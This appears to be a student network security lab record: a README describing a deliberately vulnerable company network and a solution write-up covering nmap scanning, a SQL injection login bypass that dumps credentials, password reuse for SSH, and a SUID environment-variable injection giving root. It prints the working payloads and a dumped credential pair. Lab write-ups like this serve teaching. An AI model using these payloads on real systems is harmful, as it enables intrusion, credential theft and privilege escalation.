{"description":"Network Security project about SSH, Database and SQL Injection.","goal":"","solution":"<div style=\"color: #cbcebc; background-color: #141824; font-family: Menlo, Monaco, 'Courier New', monospace; font-size: 12px; line-height: 18px; white-space: pre;\">\n<h2><span style=\"color: #a9dc76; font-weight: bold;\">Instruction: what to do</span></h2>\n<ol>\n<li>Footprinting: gather information online about the organization</li>\n<li>Scanning: scan vulnerable point of access</li>\n<li>Enumeration: probing more intrusive of vulnerable services</li>\n<li>Exploitation: attacking those potential vulnerability</li>\n</ol>\n<h2><span style=\"color: #a9dc76; font-weight: bold;\">Footprinting</span></h2>\n<div>In this case scenario we're already connected to the local network, so we've already gathered enought information about our target</div>\n<br />\n<h3><span style=\"color: #a9dc76; font-weight: bold;\">Scanning</span></h3>\n<br />\n<div>We start find out our IP address on the networks using <span style=\"color: #cbccc6;\">`</span><span style=\"color: #f29e74;\">ifconfig</span><span style=\"color: #cbccc6;\">`</span> command, and we found out.</div>\n<br />\n<div>Using then <span style=\"color: #cbccc6;\">`</span><span style=\"color: #f29e74;\">nmap</span><span style=\"color: #cbccc6;\">`</span> tool with these options:</div>\n<br />\n<ul>\n<li>&ldquo;-sn&rdquo; means &ldquo;no port scan&rdquo;</li>\n<li>&ldquo;-PE&rdquo; sends ICMP Echo Request</li>\n<li>&ldquo;--send-ip&rdquo; to not send ARP packets</li>\n</ul>\n<br />\n<div>We found out some host IP:</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/scanning_company_network.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">500</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div><span style=\"color: #cbccc6; font-weight: bold;\">**</span><span style=\"color: #cbccc6; font-style: italic; font-weight: bold;\">_</span><span style=\"color: #f28779; font-style: italic; font-weight: bold;\">Company Network</span><span style=\"color: #cbccc6; font-style: italic; font-weight: bold;\">_</span><span style=\"color: #cbccc6; font-weight: bold;\">**</span></div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/scanning_employee_network.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">500</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div><span style=\"color: #cbccc6; font-weight: bold;\">**</span><span style=\"color: #cbccc6; font-style: italic; font-weight: bold;\">_</span><span style=\"color: #f28779; font-style: italic; font-weight: bold;\">Employee Network</span><span style=\"color: #cbccc6; font-style: italic; font-weight: bold;\">_</span><span style=\"color: #cbccc6; font-weight: bold;\">**</span></div>\n<br />\n<div><span style=\"color: #cbccc6; font-weight: bold;\">##</span><span style=\"color: #a9dc76; font-weight: bold;\"> Enumeration</span></div>\n<br />\n<div>We're interested in the Web Server and in Tom PC, so we can scan more aggressively to find about any open port</div>\n<br />\n<div>If we use simply a TPC SYN scan from nmap, we find vague information:</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/enumeration_company_ss.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">500</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div>Else, if we explore more with a Version Detection scan, we can scan even beyond the typical use of a port like 8080:</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/enumeration_company_sv.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">500</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div>and we find about a web server open on port 8080.</div>\n<br />\n<div>Meanwhile on Tom PC we found an open SSH port</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/enumeration_tom_sv.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">500</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div>We can think about SSH after getting information about the site.</div>\n<div>Now we can find about this site (in a real case scenario we should use DirBuster to map the entire site) and the main page.</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/webserver_curl.png</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">500</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div>We retrived the html page using <span style=\"color: #cbccc6;\">`</span><span style=\"color: #f29e74;\">curl</span><span style=\"color: #cbccc6;\">`</span> and found out about a login form, which we can try to exploit.</div>\n<br />\n<div><span style=\"color: #cbccc6; font-weight: bold;\">##</span><span style=\"color: #a9dc76; font-weight: bold;\"> Exploitation</span></div>\n<br />\n<div>We can try some usual combination for the form</div>\n<br />\n<div><span style=\"color: #5c6773;\">```</span>bash</div>\n<div><span style=\"color: #f7cb8b;\">curl</span> <span style=\"color: #9fe7fa;\">-X</span> <span style=\"color: #e6b450;\">POST</span> <span style=\"color: #9fe7fa;\">-d</span> <span style=\"color: #cbccc6;\">'</span><span style=\"color: #95fb79;\">username=a&amp;password=b</span><span style=\"color: #cbccc6;\">'</span> <span style=\"color: #e6b450;\">193.20.3.1:</span><span style=\"color: #9ffcea;\">8080</span></div>\n<div><span style=\"color: #5c6773;\">```</span></div>\n<br />\n<div>Which returns \"Error value(s) missing\"</div>\n<br />\n<div><span style=\"color: #5c6773;\">```</span>bash</div>\n<div><span style=\"color: #f7cb8b;\">curl</span> <span style=\"color: #9fe7fa;\">-X</span> <span style=\"color: #e6b450;\">POST</span> <span style=\"color: #9fe7fa;\">-d</span> <span style=\"color: #cbccc6;\">'</span><span style=\"color: #95fb79;\">username=&amp;password=b</span><span style=\"color: #cbccc6;\">'</span> <span style=\"color: #e6b450;\">193.20.3.1:</span><span style=\"color: #9ffcea;\">8080</span></div>\n<div><span style=\"color: #5c6773;\">```</span></div>\n<br />\n<div>Which returns</div>\n<br />\n<div><span style=\"color: #cbccc6;\">`</span><span style=\"color: #f29e74;\">{\"success\":false,\"response\":\"No user found\",\"result\":[]}</span><span style=\"color: #cbccc6;\">`</span></div>\n<br />\n<div>and we can try last one with MySQL injection using OR and commenting syntax</div>\n<br />\n<div><span style=\"color: #5c6773;\">```</span>bash</div>\n<div><span style=\"color: #f7cb8b;\">curl</span> <span style=\"color: #9fe7fa;\">-X</span> <span style=\"color: #e6b450;\">POST</span> <span style=\"color: #9fe7fa;\">-d</span> <span style=\"color: #cbccc6;\">'</span><span style=\"color: #95fb79;\">username=\" OR 1&lt;2; -- &amp;password=b</span><span style=\"color: #cbccc6;\">'</span> <span style=\"color: #e6b450;\">193.20.3.1:</span><span style=\"color: #9ffcea;\">8080</span></div>\n<div><span style=\"color: #5c6773;\">```</span></div>\n<br />\n<div>which return us a bunch of credentials</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/webserver_sql.png</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">700</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div>including only one user called Tom with:</div>\n<br />\n<div><span style=\"color: #5c6773;\">```</span></div>\n<div>username = tcasaccio1</div>\n<div>password = YLN1NrMdGN</div>\n<div><span style=\"color: #5c6773;\">```</span></div>\n<br />\n<div><span style=\"color: #cbccc6; font-weight: bold;\">##</span><span style=\"color: #a9dc76; font-weight: bold;\"> SSH Access</span></div>\n<br />\n<div>Now that we gather those information, we can hope that the only user we know has the same user and password as this database.</div>\n<br />\n<div>We can try to log in using:</div>\n<br />\n<div><span style=\"color: #5c6773;\">```</span>bash</div>\n<div><span style=\"color: #f7cb8b;\">ssh</span> <span style=\"color: #e6b450;\">tcasaccio1@</span><span style=\"color: #9ffcea;\">193.20.1.3</span></div>\n<div><span style=\"color: #5c6773;\">```</span></div>\n<br />\n<div><span style=\"color: #cbccc6; font-weight: bold;\">#</span><span style=\"color: #a9dc76; font-weight: bold;\"> Privilege Escalation Procedure</span></div>\n<br />\n<div>From the ssh entrypoint on TomPC, we can trace our privileges on the machine and which files we can access:</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_whoami.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">400</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div>As we can see, user tcasaccio1 doesn't belong to sudo group, let's see if we can access to /etc/passwd and then to /etc/shadow to retrieve hashed passwords:</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_passwd.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">500</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div>We have to find another way to gain elevated privileges, let's find files with the SUID bit set:</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_suid.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">400</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_suid2.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">500</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div>The Set User IDentity bit allows users to run executables with the file system permissions of the executable's owner to perform a specific task, in this case with root privileges.</div>\n<br />\n<div>In /home/tcasaccio1 there is a file with the SUID bit set, let's see if we can exploit this program:</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_program.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">500</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div>In this case, we can modify the USER environment variable by creating an environment variable injection.</div>\n<br />\n<div><span style=\"color: #5c6773;\">```</span>bash</div>\n<div><span style=\"color: #ee68af; font-style: italic;\">export</span> USER<span style=\"color: #ee68af;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">; /bin/bash; echo </span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #e6b450;\">:tcasaccio1</span></div>\n<div><span style=\"color: #5c6773;\">```</span></div>\n<br />\n<div>Obtaining this behaviour by the program:</div>\n<br />\n<div><span style=\"color: #b3b1ad;\">&lt;</span><span style=\"color: #fc4085;\">img</span> <span style=\"color: #f9d35a; font-style: italic;\">src</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #cbccc6;\">\"</span><span style=\"color: #95fb79;\">https://github.com/Tony177/NetworkSecurity-Project/raw/main/Image/privilege_escalation_exploit.PNG</span><span style=\"color: #cbccc6;\">\"</span> <span style=\"color: #f9d35a; font-style: italic;\">width</span><span style=\"color: #cbccc6;\">=</span><span style=\"color: #e6b450;\">500</span><span style=\"color: #b3b1ad;\">&gt;</span></div>\n<br />\n<div>So now we have root permissions on the machine.</div>\n</div>","readme":"# NetworkSecurity-Project\n\nNetwork Security project about SSH, Database and SQL Injection.\n\n# Network Scheme\n\n<img src=\"https://raw.githubusercontent.com/Tony177/NetworkSecurity-Project/main/Image/network_scheme.svg\" width=500>\n\n-   Web Network\n    1. Web Server hosting a stub site using NodeJS\n    2. MySQL Server hosting sensitive information\n-   Employee Network\n    1. BobPC which represent the hacker host\n    2. TomPC which represent the target host\n-   Company Network\n    1. All the Employee network\n    2. Web Server\n\n# Background Scenario\n\nThis lab is about a industrial espionage, represented by Bob, who is infiltrated inside a company lan network and found, among a lot of other devices, one vulnerable computer that belongs to Tom and an useful site open ONLY inside the company network.\n\nDuring the demostration scenario we found out these IP:\n\n-   _172.19.0.1_ - Company Network\n-   _172.19.0.2_ - Bob PC on company network\n-   _172.19.0.3_ - Tom PC on company network\n-   _172.19.0.4_ - Web Server on company network\n-   _172.20.0.1_ - Employee Network\n-   _172.20.0.2_ - Bob PC on employee network\n-   _172.20.0.3_ - Tom PC on employee network\n\nAnd we don't have any access to the Web network\n\n# Start\n\nIn order to start this Lab, you've to connect to BobPC with ssh, on your local machine run in any console this command:\n```bash\nssh kali@localhost -p 2222\n```\nand as password insert \"_*kali*_\".\n\nNow you're connected to BobPC, start the hacking!","author":"AntonioAvolio"}
